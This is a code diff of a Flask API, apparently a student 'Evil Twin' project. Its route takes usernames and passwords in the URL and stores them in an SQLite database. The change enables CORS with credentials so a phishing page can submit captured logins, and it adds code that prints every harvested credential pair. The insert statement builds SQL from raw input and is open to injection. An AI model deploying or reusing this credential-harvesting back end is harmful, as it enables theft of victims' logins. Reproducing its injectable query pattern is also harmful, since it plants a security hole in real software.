@@ -5,8 +5,8 @@ import os
 from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app, supports_credentials=True)
 api = Api(app, title="Hacker", description="Hacker for Evil Twin. Zhou JIANG z5146092")
-CORS(app, resources=r'/*')
 
 
 def database_controller(command, database='hack.db'):
@@ -32,11 +32,17 @@ def create_db(db_file='hack.db'):
     return True
 
 
-@api.route('/hack/<username>/<password>')
+@api.route('/hack/<string:username>/<string:password>')
 class Hacker(Resource):
     def get(self, username, password):
         database_controller(f"INSERT INTO Hacker VALUES "
                             f"('{username}', '{password}');")
+
+        print("Now the database has such values:")
+        select_result = database_controller("SELECT * FROM Hacker;")
+        for i in range(len(select_result)):
+            print(f"{i} Username: {select_result[i][0]} Password: {select_result[i][1]}")
+
         return {
                 "message": "Successfully stored hacker message"
             }, 200
@@ -44,4 +50,4 @@ class Hacker(Resource):
 
 if __name__ == "__main__":
     create_db()
-    app.run(host='127.0.0.1', port=8888, debug=True)
+    app.run(host='127.0.0.1', port=9337, debug=True)
